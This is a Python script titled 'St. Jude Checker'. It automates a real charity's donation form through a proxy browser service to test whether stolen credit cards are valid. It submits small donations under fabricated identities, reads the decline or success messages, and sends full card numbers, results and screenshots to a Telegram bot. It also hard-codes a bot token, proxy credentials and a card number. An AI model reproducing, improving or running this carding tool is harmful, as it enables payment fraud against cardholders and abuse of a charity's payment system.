#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
St. Jude Checker — Playwright + BrightData Scraping Browser
"""

import re
import os
import time
import json
import random
import requests
from playwright.sync_api import sync_playwright


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

TEST_CARD = "5104040287872188|12|2027|951"

BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = "6843321125"

BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"
BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"

DONATE_URL = "https://www.stjude.org/donate/donate-to-st-jude.html"

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"]

ADDRESSES = [
    {"a1": "1600 Amphitheatre Pkwy", "c": "Mountain View", "s": "CA", "z": "94043"},
    {"a1": "350 Fifth Avenue", "c": "New York", "s": "NY", "z": "10118"},
    {"a1": "233 S Wacker Dr", "c": "Chicago", "s": "IL", "z": "60606"},
]


# ═══════════════════════════════════════════════════════════
# TELEGRAM
# ═══════════════════════════════════════════════════════════

def send_telegram_photo(photo_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': CHAT_ID, 'caption': caption[:1024]}
            r = requests.post(url, files=files, data=data, timeout=30)
            return r.status_code == 200
    except:
        return False


def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': text[:4000], 'parse_mode': 'HTML'}
        r = requests.post(url, data=data, timeout=30)
        return r.status_code == 200
    except:
        return False


def screenshot(page, name):
    try:
        os.makedirs("/app/screenshots", exist_ok=True)
        path = f"/app/screenshots/{int(time.time())}_{name}.png"
        page.screenshot(path=path, full_page=False)
        print(f"📸 {name}", flush=True)
        send_telegram_photo(path, caption=f"📸 {name}")
        return path
    except Exception as e:
        print(f"Screenshot err: {str(e)[:80]}", flush=True)
        return None


def make_email(f, l):
    return f"{f.lower()}{l.lower()}{random.randint(100,999)}@gmail.com"


# ═══════════════════════════════════════════════════════════
# MAIN CHECK
# ═══════════════════════════════════════════════════════════

def check_card(card):
    t0 = time.time()
    result = "UNKNOWN"
    
    try:
        parts = card.strip().split("|")
        if len(parts) < 4:
            return ("INVALID_FORMAT", 0)
        
        num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
        if len(yy) == 2:
            yy = "20" + yy
        
        send_telegram_message(f"🔍 <b>فحص بدأ</b>\n💳 <code>{num[:6]}****{num[-4:]}</code>")
        
        print("=" * 60, flush=True)
        print("🌐 Connecting to BrightData Scraping Browser...", flush=True)
        
        with sync_playwright() as p:
            # ═══ اتصال BrightData CDP ═══
            cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
            
            browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
            
            print("✅ Connected to BrightData", flush=True)
            
            # جلسة جديدة
            context = browser.new_context() if not browser.contexts else browser.contexts[0]
            page = context.new_page()
            
            # ═══ افتح الصفحة ═══
            print("📄 Loading page...", flush=True)
            page.goto(DONATE_URL, timeout=90000, wait_until="domcontentloaded")
            
            print("✅ Page loaded", flush=True)
            time.sleep(5)
            
            screenshot(page, "01_page_loaded")
            
            # ═══ زر Other Payment Options ═══
            try:
                page.wait_for_selector("#continue-to-other-payment", timeout=30000, state="visible")
                page.click("#continue-to-other-payment")
                print("👆 Other Payment Options", flush=True)
                time.sleep(3)
                screenshot(page, "02_other_payment")
            except Exception as e:
                print(f"⚠️ No other payment: {str(e)[:80]}", flush=True)
            
            # ═══ زر Credit Card ═══
            try:
                page.wait_for_selector("#cc-link", timeout=30000, state="visible")
                page.click("#cc-link")
                print("👆 Credit Card", flush=True)
                time.sleep(3)
                screenshot(page, "03_cc_clicked")
            except Exception as e:
                print(f"⚠️ No cc link: {str(e)[:80]}", flush=True)
            
            # ═══ انتظار الفورم ═══
            try:
                page.wait_for_selector("#cardNumber", timeout=30000, state="visible")
                print("✅ Form ready", flush=True)
            except Exception as e:
                print(f"❌ No form: {str(e)[:80]}", flush=True)
                screenshot(page, "ERR_no_form")
                return ("NO_FORM", round(time.time() - t0, 1))
            
            # ═══ ملء البيانات ═══
            f = random.choice(FIRST_NAMES)
            l = random.choice(LAST_NAMES)
            em = make_email(f, l)
            ad = random.choice(ADDRESSES)
            ph = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
            
            print("📝 Filling form...", flush=True)
            
            # Card
            page.fill("#cardNumber", num)
            time.sleep(0.1)
            page.fill("#expMonth", mm)
            time.sleep(0.05)
            page.fill("#expYear", yy[2:] if len(yy) == 4 else yy)
            time.sleep(0.05)
            page.fill("#cardCvv2", cvv)
            time.sleep(0.1)
            
            # Amount
            try:
                page.fill("#donationAmountOther", "5")
            except:
                pass
            
            # Personal
            page.fill("#firstName", f)
            time.sleep(0.05)
            page.fill("#lastName", l)
            time.sleep(0.05)
            page.fill("#email", em)
            time.sleep(0.1)
            page.fill("#address1", ad["a1"])
            time.sleep(0.1)
            page.fill("#city", ad["c"])
            time.sleep(0.1)
            
            try:
                page.select_option("#stateProvince", ad["s"])
            except:
                pass
            
            page.fill("#zipPostalCode", ad["z"])
            time.sleep(0.1)
            
            try:
                page.fill("#phoneNumber", ph)
            except:
                pass
            
            print(f"✅ Form filled", flush=True)
            time.sleep(0.5)
            screenshot(page, "04_form_filled")
            
            # ═══ Click Donate ═══
            print("👆 Clicking Donate...", flush=True)
            try:
                page.click("#donateButton")
                print("✅ Donate clicked", flush=True)
            except Exception as e:
                print(f"❌ Donate error: {str(e)[:80]}", flush=True)
            
            time.sleep(3)
            screenshot(page, "05_after_click")
            
            # ═══ انتظر الرد ═══
            print("⏳ Waiting for response...", flush=True)
            
            response = None
            for i in range(30):
                time.sleep(1)
                try:
                    page_text = page.inner_text("body")
                    text_lower = page_text.lower()
                    
                    patterns = [
                        r"there are insufficient funds[^.]*\.",
                        r"insufficient funds[^.]*\.",
                        r"your card was declined[^.]*\.",
                        r"card was declined[^.]*\.",
                        r"card has expired[^.]*\.",
                        r"security code is invalid[^.]*\.",
                        r"card number is invalid[^.]*\.",
                        r"do not honor[^.]*\.",
                        r"restricted card[^.]*\.",
                        r"suspected fraud[^.]*\.",
                        r"thank you for your donation[^.]*\.",
                        r"your donation was successful[^.]*\.",
                        r"we are sorry[^.]*\.",
                    ]
                    
                    for pat in patterns:
                        m = re.search(pat, text_lower)
                        if m:
                            response = m.group(0).strip()
                            break
                    
                    if response:
                        break
                except:
                    pass
            
            screenshot(page, "06_response")
            
            if response:
                result = response[:300]
            else:
                result = "NO_RESPONSE"
            
            page.close()
            browser.close()
    
    except Exception as e:
        result = f"ERR: {str(e)[:150]}"
        print(f"❌ Error: {str(e)[:200]}", flush=True)
    
    elapsed = round(time.time() - t0, 1)
    
    print("\n" + "=" * 60, flush=True)
    print(f"💳 {card}", flush=True)
    print(f"📝 {result}", flush=True)
    print(f"⏱️ {elapsed}s", flush=True)
    print("=" * 60, flush=True)
    
    send_telegram_message(
        f"📊 <b>النتيجة</b>\n"
        f"💳 <code>{card}</code>\n"
        f"📝 <code>{result}</code>\n"
        f"⏱️ {elapsed}s"
    )
    
    return (result, elapsed)


if __name__ == "__main__":
    print("=" * 60, flush=True)
    print("  St. Jude — Playwright + BrightData", flush=True)
    print("=" * 60, flush=True)
    print(f"💳 {TEST_CARD}", flush=True)
    print("=" * 60, flush=True)
    
    check_card(TEST_CARD)
